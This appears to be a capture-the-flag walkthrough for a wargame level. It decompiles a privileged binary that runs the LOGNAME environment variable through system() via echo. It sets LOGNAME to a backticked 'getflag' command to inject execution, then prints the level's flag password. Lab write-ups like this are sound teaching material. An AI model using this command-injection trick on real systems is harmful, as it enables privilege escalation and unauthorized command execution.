

# **Level07**

### **Walk through**

In this level, we have a binary level07

`./level07` gives us `level07`

Not so much clues at this point. Using [**ghidra**](https://www.csoonline.com/article/567221/how-to-get-started-using-ghidra-the-free-reverse-engineering-tool.html), we can disassemble the binary in C code. 

```C
int main(int argc,char **argv,char **envp) {
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}
```

Those two lines are particularly interesting:

`pcVar1 = getenv("LOGNAME");`  
`asprintf(&local_1c,"/bin/echo %s ",pcVar1);`  

We see that the env var **LOGNAME** is echoed. Indeed when we look at the env, we observe that: `LOGNAME=level07` which makes sense with the current output of `./level07`.

The idea is to change the value of **LOGNAME** to be `getflag`. The issue is that `/bin/echo getflag` just echo `getflag`. The trick is to set `getflag` between back ticks since when echo is follow by an expression between back ticks it executes and prints the result of the expression. Let's change the value of our env var.

```
export LOGNAME='\`getflag\`'
```

Now, `./level07` gives us:

**`fiumuikeil55xe9cu4dood66h`**

We will use it to log as level08

`su level08`
